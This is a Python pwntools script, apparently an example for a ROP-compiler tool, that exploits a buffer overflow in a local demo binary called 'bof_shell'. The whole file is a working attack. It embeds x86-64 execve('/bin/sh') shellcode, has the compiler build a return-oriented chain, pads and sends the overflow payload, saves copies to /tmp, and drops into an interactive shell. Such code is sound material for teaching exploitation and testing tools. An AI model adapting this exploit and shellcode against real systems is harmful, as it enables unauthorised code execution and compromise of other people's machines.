import sys, logging, binascii
from pwn import *
from rop_compiler import ropme, goal

filename = './example/bof_shell'
p = process([filename,'3000'])
#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40064f\nbreak *mprotect\nbreak *0x4006da")

shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
    "\x48\x31\xd2"                                  # xor    %rdx, %rdx
 +  "\x48\x31\xc0"                                  # xor    %rax, %rax
 +  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov  $0x68732f6e69622f2f, %rbx
 +  "\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
 +  "\x53"                                          # push   %rbx
 +  "\x48\x89\xe7"                                  # mov    %rsp, %rdi
 +  "\x50"                                          # push   %rax
 +  "\x57"                                          # push   %rdi
 +  "\x48\x89\xe6"                                  # mov    %rsp, %rsi
 +  "\xb0\x3b"                                      # mov    $0x3b, %al
 +  "\x0f\x05"                                      # syscall
)

files = [(filename, 0)]
goal_resolver = goal.create_from_arguments(files, [], [["shellcode_hex", binascii.hexlify(shellcode)]])
rop = ropme.rop(files, goal_resolver)

payload = 'A'*512 + 'B'*8 + rop

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
